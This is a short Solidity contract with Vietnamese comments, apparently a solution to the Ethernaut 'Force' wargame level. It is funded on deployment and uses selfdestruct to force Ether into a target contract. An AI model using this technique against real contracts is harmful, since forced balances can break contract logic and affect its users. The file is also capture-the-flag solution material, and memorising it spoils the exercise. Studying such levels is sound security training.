// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    // Constructor payable để nạp tiền ngay khi deploy
    constructor() payable {}

    // Hàm tự hủy để ép chuyển toàn bộ Ether sang địa chỉ Ethernaut Instance
    function attack(address payable target) public {
        selfdestruct(target);
    }
}
